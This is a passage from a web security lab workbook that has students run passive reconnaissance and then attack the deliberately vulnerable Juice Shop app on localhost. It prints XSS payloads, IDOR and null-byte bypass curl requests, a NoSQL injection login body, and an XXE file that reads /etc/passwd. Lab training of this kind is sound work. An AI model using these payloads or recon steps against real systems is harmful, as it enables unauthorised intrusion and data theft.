site:example.com filetype:pdf OR filetype:doc
```

---

## 9F: theHarvester

```bash
theHarvester -d example.com -b google
theHarvester -d example.com -b google,bing,yahoo,dnsdumpster
# 📝 Emails found: _______________
# 📝 Subdomains found: _______________
```

---

## 9G: Shodan

```
Browser: https://www.shodan.io/
Searches to try:
  - apache 2.2
  - "default password" port:80
  - hostname:example.com
# 📝 What services and ports are exposed?
```

---

## 9H: Compile OSINT Report

```
=== PASSIVE RECON REPORT ===
Target: example.com

WHOIS:            Registrar: ___ | Created: ___ | NS: ___
DNS Records:      A: ___ | MX: ___ | NS: ___ | TXT: ___
Subdomains:       _______________
Emails Found:     _______________
SSL Certificates: Issued by: ___ | Valid: ___
Shodan Findings:  Ports: ___ | Services: ___
Google Dorking:   _______________
Risk Assessment:  _______________
```

---

## ✅ Exercise 9 Checklist

- [ ] WHOIS lookup (9A)
- [ ] DNS enumeration — all record types (9B)
- [ ] Certificate transparency search (9C)
- [ ] Passive subdomain enumeration (9D)
- [ ] Google dorking (9E)
- [ ] theHarvester scan (9F)
- [ ] Shodan search (9G)
- [ ] Compiled OSINT report (9H)

---
---

# 🔬 Exercise 10: Bonus — Juice Shop Specific Challenges

> **Goal:** Exploit Juice Shop's unique vulnerabilities for extra practice
> **Time:** ~40-50 minutes

---

## 10A: Cross-Site Scripting (XSS)

### Reflected XSS (via Search)
```
Step 1: Go to http://localhost:3000/#/search

Step 2: Search for a normal product: "apple"
  📝 Notice your search term appears in the page

Step 3: Try XSS payloads:
  <iframe src="javascript:alert('XSS')">
  <img src=x onerror=alert('XSS')>
  <script>alert('XSS')</script>

📝 Which payload triggered an alert?
✅ Juice Shop Challenge: "DOM XSS" or "Reflected XSS"
```

### Stored XSS (via Feedback/Contact)
```
Step 1: Go to http://localhost:3000/#/contact

Step 2: Submit feedback with XSS payload:
  Comment: <script>alert('Stored XSS')</script>
  Rating: 5 stars

Step 3: Check if it's stored — visit the administration page:
  http://localhost:3000/#/administration
  📝 Does the XSS execute when viewing feedback?
```

---

## 10B: Broken Access Control

```bash
# Step 1: Access admin page without being admin
# Browse to: http://localhost:3000/#/administration
# 📝 Can you access it as a normal user? After SQLi admin login?

# Step 2: Access other users' baskets (IDOR)
curl http://localhost:3000/rest/basket/1 \
  -H "Authorization: Bearer YOUR_TOKEN" -s | python3 -m json.tool
curl http://localhost:3000/rest/basket/2 \
  -H "Authorization: Bearer YOUR_TOKEN" -s | python3 -m json.tool
# 📝 Can you view other users' shopping baskets?

# Step 3: View other users' orders
curl http://localhost:3000/rest/track-order/1 -s
curl http://localhost:3000/rest/track-order/2 -s
# 📝 Can you track other users' orders?

# Step 4: Access the /ftp directory for confidential files
curl http://localhost:3000/ftp/ -s
curl http://localhost:3000/ftp/acquisitions.md -s
# 📝 What confidential files are exposed?
```

---

## 10C: Sensitive Data Exposure

```bash
# Step 1: Find exposed metrics
curl http://localhost:3000/metrics -s | head -30
# 📝 What application metrics are exposed?

# Step 2: Check for exposed config
curl http://localhost:3000/rest/admin/application-configuration \
  -H "Authorization: Bearer ADMIN_JWT" -s | python3 -m json.tool | head -30

# Step 3: Download backup files from /ftp
curl http://localhost:3000/ftp/package.json.bak -s
curl http://localhost:3000/ftp/coupons_2013.md.bak -s
# 📝 What sensitive data is in the backup files?

# Step 4: Null byte bypass for other file types
curl "http://localhost:3000/ftp/eastere.gg%2500.md" -s
curl "http://localhost:3000/ftp/suspicious_errors.yml%2500.md" -s
# 📝 Can you access files that should be restricted?
```

---

## 10D: Injection Attacks Beyond SQLi

### NoSQL Injection (if applicable)
```bash
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$gt":""},"password":{"$gt":""}}'
# 📝 Does NoSQL injection work?
```

### XXE (XML External Entity) via File Upload
```bash
# Create a malicious XML file
cat > /tmp/xxe.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId></stockCheck>
EOF

# Try uploading via complaint form or API
# 📝 Does the server process XML entities?
```

---

## 10E: Solve Juice Shop Score Board Challenges

```
1. Navigate to http://localhost:3000/#/score-board

2. Try solving these beginner challenges:
   ★☆☆☆☆☆ Challenges (1-star):
   - Score Board (find the score board page)
   - Bonus Payload (use a specific XSS payload)
   - DOM XSS (perform DOM-based XSS)
   - Confidential Document (access a confidential file)
   - Error Handling (provoke an error with useful info)
   - Zero Stars (rate with 0 stars)
   - Repetitive Registration (register via API)

3. Try solving ★★☆☆☆☆ (2-star) challenges:
   - Login Admin (admin login without password)
   - Password Strength (crack admin password)
   - View Basket (view another user's basket)
   - Five-Star Feedback (rate 5-star without login)
   - Admin Section (access admin panel)

📝 How many challenges did you solve? _______________
📝 What technique was most useful? _______________
```

---

## ✅ Exercise 10 Checklist

- [ ] Performed reflected & stored XSS (10A)
- [ ] Exploited broken access control — IDOR on baskets (10B)
- [ ] Found sensitive data exposure — metrics, backups, config (10C)
- [ ] Attempted advanced injection attacks (10D)
- [ ] Solved at least 5 Juice Shop score board challenges (10E)

---

# 🎉 Congratulations! All Juice Shop Exercises Complete!

## Skills Practiced on a Modern Stack (Node.js / Angular / REST API / JWT):

| Skill | DVWA (PHP/MySQL) | Juice Shop (Node/Angular/SQLite) |
|-------|:-:|:-:|
| Encoding/Hashing/JWT | ✅ | ✅ |
| Web Recon & Hidden Content | ✅ | ✅ |
| SQL Injection Login Bypass | ✅ | ✅ |
| Server Fingerprinting | ✅ | ✅ |
| Form & Request Manipulation | ✅ | ✅ |
| User Enumeration | ✅ | ✅ |
| 2FA Bypass | ✅ | ✅ |
| REST API Exploitation | ✅ | ✅ |
| Passive Recon (OSINT) | ✅ | ✅ |
| XSS / IDOR / Access Control | ❌ | ✅ |

## What's Next?

1. **Redo without instructions** — test your memory
2. **Try Juice Shop Score Board** — solve all ★☆☆☆☆☆ and ★★☆☆☆☆ challenges
3. **Move to Moderate Challenges** — escalate your skills
4. **Build a portfolio** — document your solutions as write-ups
